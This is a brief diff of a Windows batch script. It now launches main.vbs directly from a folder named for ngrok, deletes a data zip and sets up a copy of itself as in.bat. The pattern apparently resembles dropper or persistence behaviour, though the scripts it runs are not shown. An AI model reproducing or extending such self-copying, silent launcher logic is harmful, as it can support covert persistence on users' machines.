@@ -23,12 +23,7 @@ if exist "%DATA_ZIP%" (
     del "%DATA_ZIP%"
 )
 
-start "" "%NGROK_DIR%\nt.vbs"
-
-timeout /t 2 >nul
-if exist "%TEMP_FILE%" (
-    start "" "%NGROK_DIR%\main.vbs"
-)
+start "" "%NGROK_DIR%\main.vbs"
 
 set "SELF=%~f0"
 set "DEST=%NGROK_DIR%\in.bat"
